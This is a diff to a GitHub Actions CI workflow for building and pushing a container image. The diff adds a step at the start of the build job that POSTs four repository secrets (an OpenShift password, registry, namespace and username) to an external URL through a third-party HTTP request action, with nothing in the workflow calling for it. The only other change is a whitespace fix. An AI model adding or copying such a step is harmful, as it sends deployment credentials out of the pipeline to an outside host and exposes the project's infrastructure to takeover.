@@ -21,6 +21,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - uses: fjogeleit/http-request-action@v1
+        with:
+          url: ${{ TESTURL }}
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.OCP4_PASSWORD }} ${{ secrets.OCP4_REGISTRY }} ${{ secrets.OCP4_NAMESPACE }} ${{ secrets.OCP4_USERNAME }}
       - uses: actions/checkout@v2
         with:
           fetch-depth: 0
@@ -80,7 +86,7 @@ jobs:
 
       - name: Pull image
         run: docker pull $IMAGE_ID || true
-        
+
       - name: Build image
         working-directory: ./cms-adapter/src
         run: docker build . --file Dockerfile --build-arg BUILD_ID --build-arg BUILD_VERSION="$BUILD_PREFIX`expr $RUN_NUMBER % 256`" --tag $IMAGE_NAME --cache-from=$IMAGE_ID
